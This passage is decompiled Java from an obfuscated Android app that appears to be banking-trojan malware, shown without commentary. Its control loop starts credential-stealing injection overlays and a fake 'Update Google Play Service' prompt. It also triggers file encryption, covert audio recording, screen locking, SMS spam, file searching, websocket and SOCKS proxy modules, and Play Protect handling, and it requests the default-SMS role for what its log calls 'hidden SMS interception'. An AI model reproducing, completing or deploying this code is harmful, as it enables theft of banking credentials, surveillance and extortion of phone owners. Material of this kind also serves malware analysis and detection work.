            java.lang.String r2 = "keyguard"
            java.lang.Object r2 = r1.getSystemService(r2)
            android.app.KeyguardManager r2 = (android.app.KeyguardManager) r2
            boolean r2 = r2.inKeyguardRestrictedInputMode()
            r3 = 26
            if (r2 == 0) goto L_0x00f5
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f420b
            java.lang.String r7 = "foregroundwhile"
            java.lang.String r5 = r5.mo234e(r1, r7)
            java.lang.String r7 = "true"
            boolean r5 = r5.equals(r7)
            if (r5 == 0) goto L_0x00f9
            int r5 = android.os.Build.VERSION.SDK_INT
            if (r5 < r3) goto L_0x00f1
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f420b
            java.lang.String r5 = "Google"
            java.lang.String r7 = "Update Google Play Service"
            wocwvy.czyxoxmbauu.slsa.C0034b.m228a(r1, r5, r7)
            goto L_0x00f9
        L_0x00f1:
            r17.m294a()
            goto L_0x00f9
        L_0x00f5:
            r5 = 1
            r1.stopForeground(r5)
        L_0x00f9:
            r5 = 1073741824(0x40000000, float:2.0)
            r7 = 268435456(0x10000000, float:2.5243549E-29)
            wocwvy.czyxoxmbauu.slsa.b r14 = r1.f420b     // Catch:{ Exception -> 0x0160 }
            android.content.Context r15 = r1.f423e     // Catch:{ Exception -> 0x0160 }
            java.lang.String r3 = "urls"
            java.lang.String r3 = r14.mo234e(r15, r3)     // Catch:{ Exception -> 0x0160 }
            int r3 = r3.length()     // Catch:{ Exception -> 0x0160 }
            r14 = 1
            if (r3 > r14) goto L_0x0169
            boolean r3 = r4.isAdminActive(r13)     // Catch:{ Exception -> 0x0160 }
            if (r3 == 0) goto L_0x0143
            android.content.Intent r3 = new android.content.Intent     // Catch:{ Exception -> 0x0160 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.a.b> r4 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a.C0065b.class
            r3.<init>(r1, r4)     // Catch:{ Exception -> 0x0160 }
            java.lang.String r4 = "str"
            java.lang.String r13 = "stop"
            r3.putExtra(r4, r13)     // Catch:{ Exception -> 0x0160 }
            r3.addFlags(r7)     // Catch:{ Exception -> 0x0160 }
            r4 = 536870912(0x20000000, float:1.0842022E-19)
            r3.addFlags(r4)     // Catch:{ Exception -> 0x0160 }
            r3.addFlags(r5)     // Catch:{ Exception -> 0x0160 }
            r1.startActivity(r3)     // Catch:{ Exception -> 0x0160 }
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b     // Catch:{ Exception -> 0x0160 }
            java.lang.String r4 = "lock_inj"
            java.lang.String r13 = ""
            r3.mo233d(r1, r4, r13)     // Catch:{ Exception -> 0x0160 }
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b     // Catch:{ Exception -> 0x0160 }
            java.lang.String r4 = "save_inj"
            java.lang.String r13 = ""
            r3.mo233d(r1, r4, r13)     // Catch:{ Exception -> 0x0160 }
            goto L_0x0169
        L_0x0143:
            r4 = 5000(0x1388, float:7.006E-42)
            android.content.Intent r3 = new android.content.Intent     // Catch:{ Exception -> 0x0160 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.dzudmx> r13 = wocwvy.czyxoxmbauu.slsa.ncec.dzudmx.class
            r3.<init>(r1, r13)     // Catch:{ Exception -> 0x0160 }
            java.lang.String r13 = "start"
            java.lang.String r14 = "deleteApp"
            android.content.Intent r3 = r3.putExtra(r13, r14)     // Catch:{ Exception -> 0x0160 }
            r3.addFlags(r7)     // Catch:{ Exception -> 0x0160 }
            r3.addFlags(r5)     // Catch:{ Exception -> 0x0160 }
            r1.startActivity(r3)     // Catch:{ Exception -> 0x0160 }
        L_0x015d:
            r2 = 1
            goto L_0x008c
        L_0x0160:
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b
            java.lang.String r4 = "jtfxlnc"
            java.lang.String r13 = "STARTWHEIL -> stopSelf() error"
            r3.mo213a(r4, r13)
        L_0x0169:
            int r6 = r6 + 2
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b
            boolean r3 = r3.mo235e(r1)
            if (r3 == 0) goto L_0x017b
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b
            boolean r3 = r3.mo237g(r1)
            if (r3 != 0) goto L_0x0195
        L_0x017b:
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b
            android.content.Context r4 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.kldqwysgkfcrmq> r13 = wocwvy.czyxoxmbauu.slsa.kldqwysgkfcrmq.class
            boolean r3 = r3.mo215a(r4, r13)
            if (r3 != 0) goto L_0x0195
            android.content.Context r3 = r1.f423e     // Catch:{ Exception -> 0x0195 }
            android.content.Intent r4 = new android.content.Intent     // Catch:{ Exception -> 0x0195 }
            android.content.Context r13 = r1.f423e     // Catch:{ Exception -> 0x0195 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.kldqwysgkfcrmq> r14 = wocwvy.czyxoxmbauu.slsa.kldqwysgkfcrmq.class
            r4.<init>(r13, r14)     // Catch:{ Exception -> 0x0195 }
            r3.startService(r4)     // Catch:{ Exception -> 0x0195 }
        L_0x0195:
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b
            boolean r3 = r3.mo237g(r1)
            if (r3 != 0) goto L_0x01c8
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b
            android.content.Context r4 = r1.f423e
            java.lang.String r13 = "save_inj"
            java.lang.String r3 = r3.mo234e(r4, r13)
            int r3 = r3.length()
            r4 = 5
            if (r3 < r4) goto L_0x01c8
            wocwvy.czyxoxmbauu.slsa.b r3 = r1.f420b
            android.content.Context r4 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wfveenegvz> r13 = wocwvy.czyxoxmbauu.slsa.wfveenegvz.class
            boolean r3 = r3.mo215a(r4, r13)
            if (r3 != 0) goto L_0x01c8
            android.content.Context r3 = r1.f423e
            android.content.Intent r4 = new android.content.Intent
            android.content.Context r13 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wfveenegvz> r14 = wocwvy.czyxoxmbauu.slsa.wfveenegvz.class
            r4.<init>(r13, r14)
            r3.startService(r4)
        L_0x01c8:
            r3 = 2000(0x7d0, float:2.803E-42)
            r4 = 8388608(0x800000, float:1.17549435E-38)
            if (r2 != 0) goto L_0x01f3
            wocwvy.czyxoxmbauu.slsa.b r13 = r1.f420b
            java.lang.String r14 = "cryptfile"
            java.lang.String r13 = r13.mo234e(r1, r14)
            java.lang.String r14 = "true"
            boolean r13 = r13.equals(r14)
            if (r13 == 0) goto L_0x01f3
            android.content.Intent r3 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.kcdbt> r13 = wocwvy.czyxoxmbauu.slsa.ncec.kcdbt.class
            r3.<init>(r1, r13)
            r3.addFlags(r7)
            r3.addFlags(r4)
            r3.addFlags(r5)
            r1.startActivity(r3)
            r3 = 500(0x1f4, float:7.0E-43)
        L_0x01f3:
            wocwvy.czyxoxmbauu.slsa.b r13 = r1.f420b     // Catch:{ Exception -> 0x0237 }
            java.lang.String r14 = "startRecordSound"
            java.lang.String r13 = r13.mo234e(r1, r14)     // Catch:{ Exception -> 0x0237 }
            java.lang.String r14 = "stop"
            boolean r13 = r13.equals(r14)     // Catch:{ Exception -> 0x0237 }
            if (r13 == 0) goto L_0x0240
            wocwvy.czyxoxmbauu.slsa.b r13 = r1.f420b     // Catch:{ Exception -> 0x0237 }
            java.lang.String r14 = "recordsoundseconds"
            java.lang.String r13 = r13.mo234e(r1, r14)     // Catch:{ Exception -> 0x0237 }
            int r13 = java.lang.Integer.parseInt(r13)     // Catch:{ Exception -> 0x0237 }
            if (r13 <= 0) goto L_0x0240
            android.content.Context r14 = r1.f423e     // Catch:{ Exception -> 0x0237 }
            android.content.Intent r15 = new android.content.Intent     // Catch:{ Exception -> 0x0237 }
            android.content.Context r4 = r1.f423e     // Catch:{ Exception -> 0x0237 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf> r5 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.class
            r15.<init>(r4, r5)     // Catch:{ Exception -> 0x0237 }
            java.lang.String r4 = "time"
            java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0237 }
            r5.<init>()     // Catch:{ Exception -> 0x0237 }
            java.lang.String r7 = ""
            r5.append(r7)     // Catch:{ Exception -> 0x0237 }
            r5.append(r13)     // Catch:{ Exception -> 0x0237 }
            java.lang.String r5 = r5.toString()     // Catch:{ Exception -> 0x0237 }
            android.content.Intent r4 = r15.putExtra(r4, r5)     // Catch:{ Exception -> 0x0237 }
            r14.startService(r4)     // Catch:{ Exception -> 0x0237 }
            goto L_0x0240
        L_0x0237:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r5 = "jtfxlnc"
            java.lang.String r7 = "Error Recod Sound"
            r4.mo213a(r5, r7)
        L_0x0240:
            if (r2 != 0) goto L_0x026a
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r5 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ttiegryczsx> r7 = wocwvy.czyxoxmbauu.slsa.ttiegryczsx.class
            boolean r4 = r4.mo215a(r5, r7)
            if (r4 != 0) goto L_0x026a
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r5 = "lookscreen"
            java.lang.String r4 = r4.mo234e(r1, r5)
            java.lang.String r5 = "true"
            boolean r4 = r4.equals(r5)
            if (r4 == 0) goto L_0x026a
            android.content.Intent r4 = new android.content.Intent
            android.content.Context r5 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ttiegryczsx> r7 = wocwvy.czyxoxmbauu.slsa.ttiegryczsx.class
            r4.<init>(r5, r7)
            r1.startService(r4)
        L_0x026a:
            int r4 = android.os.Build.VERSION.SDK_INT
            r5 = 26
            if (r4 < r5) goto L_0x029f
            android.content.Context r4 = r1.f423e
            java.lang.String r5 = "power"
            java.lang.Object r4 = r4.getSystemService(r5)
            android.os.PowerManager r4 = (android.os.PowerManager) r4
            android.content.Context r5 = r1.f423e
            java.lang.String r5 = r5.getPackageName()
            boolean r4 = r4.isIgnoringBatteryOptimizations(r5)
            if (r4 == 0) goto L_0x02b5
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r5 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.blyvffs> r7 = wocwvy.czyxoxmbauu.slsa.blyvffs.class
            boolean r4 = r4.mo215a(r5, r7)
            if (r4 != 0) goto L_0x02b5
            android.content.Intent r4 = new android.content.Intent     // Catch:{ Exception -> 0x02b5 }
            android.content.Context r5 = r1.f423e     // Catch:{ Exception -> 0x02b5 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.blyvffs> r7 = wocwvy.czyxoxmbauu.slsa.blyvffs.class
            r4.<init>(r5, r7)     // Catch:{ Exception -> 0x02b5 }
        L_0x029b:
            r1.startService(r4)     // Catch:{ Exception -> 0x02b5 }
            goto L_0x02b5
        L_0x029f:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r5 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.blyvffs> r7 = wocwvy.czyxoxmbauu.slsa.blyvffs.class
            boolean r4 = r4.mo215a(r5, r7)
            if (r4 != 0) goto L_0x02b5
            android.content.Intent r4 = new android.content.Intent     // Catch:{ Exception -> 0x02b5 }
            android.content.Context r5 = r1.f423e     // Catch:{ Exception -> 0x02b5 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.blyvffs> r7 = wocwvy.czyxoxmbauu.slsa.blyvffs.class
            r4.<init>(r5, r7)     // Catch:{ Exception -> 0x02b5 }
            goto L_0x029b
        L_0x02b5:
            int r4 = android.os.Build.VERSION.SDK_INT
            r5 = 20
            r7 = 12
            if (r4 < r5) goto L_0x039b
            wocwvy.czyxoxmbauu.slsa.c r4 = r1.f419a
            int r4 = r4.f391r
            if (r8 < r4) goto L_0x030e
            wocwvy.czyxoxmbauu.slsa.c r4 = r1.f419a
            boolean r4 = r4.f390q
            if (r4 == 0) goto L_0x030e
            r4 = 11
            if (r6 == r4) goto L_0x02cf
            if (r6 != r7) goto L_0x030e
        L_0x02cf:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r5 = "play_protect"
            java.lang.String r4 = r4.mo234e(r1, r5)
            java.lang.String r5 = "error"
            boolean r4 = r4.equals(r5)
            if (r4 != 0) goto L_0x030e
            java.io.File r4 = new java.io.File
            java.lang.String r5 = "apk"
            r13 = 0
            java.io.File r5 = r1.getDir(r5, r13)
            java.lang.StringBuilder r13 = new java.lang.StringBuilder
            r13.<init>()
            wocwvy.czyxoxmbauu.slsa.c r14 = r1.f419a
            r14.getClass()
            java.lang.String r14 = "crypt"
            r13.append(r14)
            java.lang.String r14 = ".apk"
            r13.append(r14)
            java.lang.String r13 = r13.toString()
            r4.<init>(r5, r13)
            boolean r4 = r4.exists()
            if (r4 == 0) goto L_0x030e
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b     // Catch:{ Exception -> 0x030e }
            wocwvy.czyxoxmbauu.slsa.C0034b.m229a(r17)     // Catch:{ Exception -> 0x030e }
        L_0x030e:
            if (r2 != 0) goto L_0x039b
            r2 = 15
            if (r6 == r2) goto L_0x0318
            r4 = 16
            if (r6 != r4) goto L_0x039d
        L_0x0318:
            wocwvy.czyxoxmbauu.slsa.c r4 = r1.f419a
            int r4 = r4.f391r
            if (r8 < r4) goto L_0x039d
            wocwvy.czyxoxmbauu.slsa.c r4 = r1.f419a
            boolean r4 = r4.f390q
            if (r4 == 0) goto L_0x039d
            java.io.File r4 = new java.io.File
            java.lang.String r5 = "apk"
            r13 = 0
            java.io.File r5 = r1.getDir(r5, r13)
            java.lang.StringBuilder r13 = new java.lang.StringBuilder
            r13.<init>()
            wocwvy.czyxoxmbauu.slsa.c r14 = r1.f419a
            r14.getClass()
            java.lang.String r14 = "crypt"
            r13.append(r14)
            java.lang.String r14 = ".apk"
            r13.append(r14)
            java.lang.String r13 = r13.toString()
            r4.<init>(r5, r13)
            boolean r4 = r4.exists()
            if (r4 == 0) goto L_0x0391
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b     // Catch:{ Exception -> 0x0373 }
            java.lang.String r5 = "play_protect"
            java.lang.String r4 = r4.mo234e(r1, r5)     // Catch:{ Exception -> 0x0373 }
            java.lang.String r5 = "true"
            boolean r4 = r4.equals(r5)     // Catch:{ Exception -> 0x0373 }
            if (r4 == 0) goto L_0x037c
            android.content.Intent r4 = new android.content.Intent     // Catch:{ Exception -> 0x0373 }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.ovyvpsbxxrtayd> r5 = wocwvy.czyxoxmbauu.slsa.ncec.ovyvpsbxxrtayd.class
            r4.<init>(r1, r5)     // Catch:{ Exception -> 0x0373 }
            r5 = 268435456(0x10000000, float:2.5243549E-29)
            r4.addFlags(r5)     // Catch:{ Exception -> 0x0373 }
            r5 = 1073741824(0x40000000, float:2.0)
            r4.addFlags(r5)     // Catch:{ Exception -> 0x0373 }
            r1.startActivity(r4)     // Catch:{ Exception -> 0x0373 }
            goto L_0x037c
        L_0x0373:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r5 = "jtfxlnc"
            java.lang.String r13 = "ERROR getProtect"
            r4.mo213a(r5, r13)
        L_0x037c:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b     // Catch:{ Exception -> 0x0391 }
            java.lang.String r5 = "play_protect"
            java.lang.String r4 = r4.mo234e(r1, r5)     // Catch:{ Exception -> 0x0391 }
            java.lang.String r5 = "error"
            boolean r4 = r4.equals(r5)     // Catch:{ Exception -> 0x0391 }
            if (r4 != 0) goto L_0x0391
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b     // Catch:{ Exception -> 0x0391 }
            wocwvy.czyxoxmbauu.slsa.C0034b.m229a(r17)     // Catch:{ Exception -> 0x0391 }
        L_0x0391:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r5 = "DexSocksMolude"
            java.lang.String r13 = "yes"
            r4.mo233d(r1, r5, r13)
            goto L_0x039d
        L_0x039b:
            r2 = 15
        L_0x039d:
            r4 = 25
            r5 = 2
            if (r6 < r4) goto L_0x0506
            int r8 = r8 + 25
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r6 = "time_work"
            java.lang.String r13 = java.lang.String.valueOf(r8)
            r4.mo233d(r1, r6, r13)
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r6 = "TIME"
            java.lang.String r13 = java.lang.String.valueOf(r8)
            r4.mo213a(r6, r13)
            r17.m295b()
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.xelytgswelv> r13 = wocwvy.czyxoxmbauu.slsa.xelytgswelv.class
            boolean r4 = r4.mo215a(r6, r13)
            if (r4 != 0) goto L_0x03e9
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            java.lang.String r13 = "websocket"
            java.lang.String r4 = r4.mo234e(r6, r13)
            java.lang.String r6 = ""
            boolean r4 = r4.equals(r6)
            if (r4 != 0) goto L_0x03e9
            android.content.Context r4 = r1.f423e
            android.content.Intent r6 = new android.content.Intent
            android.content.Context r13 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.xelytgswelv> r14 = wocwvy.czyxoxmbauu.slsa.xelytgswelv.class
            r6.<init>(r13, r14)
            r4.startService(r6)
        L_0x03e9:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz.wifu> r13 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz.wifu.class
            boolean r4 = r4.mo215a(r6, r13)
            if (r4 != 0) goto L_0x0424
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            wocwvy.czyxoxmbauu.slsa.a r6 = r1.f421c
            java.lang.String[] r6 = r6.f335b
            r13 = 0
            r6 = r6[r13]
            boolean r4 = r4.mo229c(r1, r6)
            if (r4 == 0) goto L_0x0424
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            java.lang.String r13 = "spamSMS"
            java.lang.String r4 = r4.mo234e(r6, r13)
            java.lang.String r6 = "start"
            boolean r4 = r4.equals(r6)
            if (r4 == 0) goto L_0x0424
            android.content.Context r4 = r1.f423e
            android.content.Intent r6 = new android.content.Intent
            android.content.Context r13 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz.wifu> r14 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz.wifu.class
            r6.<init>(r13, r14)
            r4.startService(r6)
        L_0x0424:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            wocwvy.czyxoxmbauu.slsa.a r6 = r1.f421c
            java.lang.String[] r6 = r6.f336c
            r13 = 0
            r6 = r6[r13]
            boolean r4 = r4.mo229c(r1, r6)
            if (r4 == 0) goto L_0x0490
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r6 = "startFind"
            java.lang.String r13 = "1"
            r4.mo213a(r6, r13)
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.mvqkjokaxfrpf> r13 = wocwvy.czyxoxmbauu.slsa.mvqkjokaxfrpf.class
            boolean r4 = r4.mo215a(r6, r13)
            if (r4 != 0) goto L_0x0490
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            java.lang.String r13 = "findfiles"
            java.lang.String r4 = r4.mo234e(r6, r13)
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f420b
            java.lang.String r13 = "startFind"
            java.lang.StringBuilder r14 = new java.lang.StringBuilder
            r14.<init>()
            java.lang.String r15 = "2"
            r14.append(r15)
            r14.append(r4)
            java.lang.String r14 = r14.toString()
            r6.mo213a(r13, r14)
            int r6 = r4.length()
            r13 = 1
            if (r6 <= r13) goto L_0x0490
            java.lang.String r6 = "**false**"
            boolean r4 = r4.equals(r6)
            if (r4 != 0) goto L_0x0490
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            java.lang.String r6 = "jtfxlnc"
            java.lang.String r13 = "Find Start 3"
            r4.mo213a(r6, r13)
            android.content.Context r4 = r1.f423e
            android.content.Intent r6 = new android.content.Intent
            android.content.Context r13 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.mvqkjokaxfrpf> r14 = wocwvy.czyxoxmbauu.slsa.mvqkjokaxfrpf.class
            r6.<init>(r13, r14)
            r4.startService(r6)
        L_0x0490:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wahiuolww> r13 = wocwvy.czyxoxmbauu.slsa.wahiuolww.class
            boolean r4 = r4.mo215a(r6, r13)
            if (r4 != 0) goto L_0x04cc
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            wocwvy.czyxoxmbauu.slsa.a r13 = r1.f421c
            java.lang.String[] r13 = r13.f336c
            r14 = 0
            r13 = r13[r14]
            boolean r4 = r4.mo229c(r6, r13)
            if (r4 == 0) goto L_0x04cd
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r6 = r1.f423e
            java.lang.String r13 = "status"
            java.lang.String r4 = r4.mo234e(r6, r13)
            int r4 = r4.length()
            if (r4 <= r5) goto L_0x04cd
            android.content.Context r4 = r1.f423e
            android.content.Intent r6 = new android.content.Intent
            android.content.Context r13 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.wahiuolww> r15 = wocwvy.czyxoxmbauu.slsa.wahiuolww.class
            r6.<init>(r13, r15)
            r4.startService(r6)
            goto L_0x04cd
        L_0x04cc:
            r14 = 0
        L_0x04cd:
            wocwvy.czyxoxmbauu.slsa.c r4 = r1.f419a
            int r4 = r4.f393t
            r6 = 3
            if (r4 == r6) goto L_0x04df
            wocwvy.czyxoxmbauu.slsa.c r4 = r1.f419a
            int r4 = r4.f393t
            r6 = 6
            if (r4 != r6) goto L_0x04dc
            goto L_0x04df
        L_0x04dc:
            r4 = 1000(0x3e8, float:1.401E-42)
            goto L_0x0504
        L_0x04df:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b     // Catch:{ Exception -> 0x04dc }
            java.lang.String r6 = "startRequest"
            java.lang.String r4 = r4.mo234e(r1, r6)     // Catch:{ Exception -> 0x04dc }
            java.lang.String r6 = "Access=0"
            boolean r6 = r4.contains(r6)     // Catch:{ Exception -> 0x04dc }
            if (r6 != 0) goto L_0x04f7
            java.lang.String r6 = "Perm=0"
            boolean r4 = r4.contains(r6)     // Catch:{ Exception -> 0x04dc }
            if (r4 == 0) goto L_0x04dc
        L_0x04f7:
            r4 = 1000(0x3e8, float:1.401E-42)
            if (r8 < r4) goto L_0x0504
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f420b     // Catch:{ Exception -> 0x0504 }
            java.lang.String r13 = "startRequest"
            java.lang.String r15 = "Access=1Perm=1"
            r6.mo233d(r1, r13, r15)     // Catch:{ Exception -> 0x0504 }
        L_0x0504:
            r6 = 0
            goto L_0x0509
        L_0x0506:
            r4 = 1000(0x3e8, float:1.401E-42)
            r14 = 0
        L_0x0509:
            int r10 = r10 + 1
            int r11 = r11 + 1
            wocwvy.czyxoxmbauu.slsa.b r13 = r1.f420b
            java.lang.String r15 = "Time Requst HTTP"
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            int r4 = r12 / 1000
            r2.append(r4)
            java.lang.String r14 = " = "
            r2.append(r14)
            r2.append(r10)
            java.lang.String r2 = r2.toString()
            r13.mo213a(r15, r2)
            int r4 = r4 + r5
            if (r10 < r4) goto L_0x054b
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            android.content.Context r4 = r1.f423e
            java.lang.String r10 = "interval"
            java.lang.String r2 = r2.mo234e(r4, r10)
            int r2 = java.lang.Integer.parseInt(r2)
            android.content.Context r4 = r1.f423e
            android.content.Intent r10 = new android.content.Intent
            android.content.Context r12 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ukhakhcgifofl> r13 = wocwvy.czyxoxmbauu.slsa.ukhakhcgifofl.class
            r10.<init>(r12, r13)
            r4.startService(r10)
            r12 = r2
            r10 = 0
        L_0x054b:
            wocwvy.czyxoxmbauu.slsa.c r2 = r1.f419a
            r2.getClass()
            if (r11 < r7) goto L_0x05ad
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            android.content.Context r4 = r1.f423e
            boolean r2 = r2.mo245o(r4)
            if (r2 == 0) goto L_0x05ac
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            android.content.Context r4 = r1.f423e
            java.lang.String r7 = "lock_inj"
            java.lang.String r2 = r2.mo234e(r4, r7)
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            android.content.Context r7 = r1.f423e
            java.lang.String r9 = "del_sws"
            java.lang.String r4 = r4.mo234e(r7, r9)
            java.lang.String r7 = "true"
            boolean r9 = r4.contains(r7)
            r4 = 0
            boolean r4 = r2.equals(r4)     // Catch:{ Exception -> 0x05ac }
            if (r4 == 0) goto L_0x0585
            java.lang.String r4 = ""
            boolean r4 = r2.equals(r4)     // Catch:{ Exception -> 0x05ac }
            if (r4 != 0) goto L_0x05ac
        L_0x0585:
            int r4 = r2.length()     // Catch:{ Exception -> 0x05ac }
            if (r4 <= r5) goto L_0x05ac
            android.content.Intent r4 = new android.content.Intent     // Catch:{ Exception -> 0x05ac }
            android.content.Context r5 = r1.f423e     // Catch:{ Exception -> 0x05ac }
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.pltrfi> r7 = wocwvy.czyxoxmbauu.slsa.ncec.pltrfi.class
            r4.<init>(r5, r7)     // Catch:{ Exception -> 0x05ac }
            java.lang.String r5 = "str"
            android.content.Intent r2 = r4.putExtra(r5, r2)     // Catch:{ Exception -> 0x05ac }
            r4 = 268435456(0x10000000, float:2.5243549E-29)
            r2.addFlags(r4)     // Catch:{ Exception -> 0x05ac }
            r4 = 8388608(0x800000, float:1.17549435E-38)
            r2.addFlags(r4)     // Catch:{ Exception -> 0x05ac }
            r4 = 1073741824(0x40000000, float:2.0)
            r2.addFlags(r4)     // Catch:{ Exception -> 0x05ac }
            r1.startActivity(r2)     // Catch:{ Exception -> 0x05ac }
        L_0x05ac:
            r11 = 0
        L_0x05ad:
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            java.lang.String r4 = "jtfxlnc"
            r2.mo209a(r1, r4)
            r4 = 2000(0x7d0, double:9.88E-321)
            r2 = 19
            r7 = 1
            if (r9 != r7) goto L_0x0621
            int r13 = android.os.Build.VERSION.SDK_INT
            if (r13 < r2) goto L_0x06a1
            java.lang.String r2 = android.provider.Telephony.Sms.getDefaultSmsPackage(r17)
            java.lang.String r13 = r17.getPackageName()
            boolean r2 = r2.equals(r13)
            if (r2 != 0) goto L_0x06a1
            android.content.Context r2 = r1.f423e
            java.lang.String r2 = "keyguard"
            java.lang.Object r2 = r1.getSystemService(r2)
            android.app.KeyguardManager r2 = (android.app.KeyguardManager) r2
            boolean r2 = r2.inKeyguardRestrictedInputMode()
            if (r2 != 0) goto L_0x06a1
            java.util.concurrent.TimeUnit r2 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x05e3 }
            r2.sleep(r4)     // Catch:{ InterruptedException -> 0x05e3 }
            goto L_0x05e8
        L_0x05e3:
            r0 = move-exception
            r2 = r0
            r2.printStackTrace()
        L_0x05e8:
            android.content.Intent r2 = new android.content.Intent
            java.lang.String r4 = "android.provider.Telephony.ACTION_CHANGE_DEFAULT"
            r2.<init>(r4)
            java.lang.String r4 = "package"
            java.lang.String r5 = r17.getPackageName()
            r2.putExtra(r4, r5)
            r4 = 268435456(0x10000000, float:2.5243549E-29)
            r2.addFlags(r4)
            r1.startActivity(r2)
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            java.lang.String r4 = "4"
            java.lang.StringBuilder r5 = new java.lang.StringBuilder
            r5.<init>()
            java.lang.String r13 = "p="
            r5.append(r13)
            wocwvy.czyxoxmbauu.slsa.b r13 = r1.f420b
            java.lang.StringBuilder r14 = new java.lang.StringBuilder
            r14.<init>()
            wocwvy.czyxoxmbauu.slsa.b r15 = r1.f420b
            java.lang.String r15 = r15.mo247q(r1)
            r14.append(r15)
            java.lang.String r15 = "|Request for SMS manager change(hidden SMS interception)|"
            goto L_0x068c
        L_0x0621:
            if (r9 != 0) goto L_0x06a1
            int r13 = android.os.Build.VERSION.SDK_INT
            if (r13 < r2) goto L_0x06a1
            java.lang.String r2 = android.provider.Telephony.Sms.getDefaultSmsPackage(r17)
            java.lang.String r13 = r17.getPackageName()
            boolean r2 = r2.equals(r13)
            if (r2 == 0) goto L_0x06a1
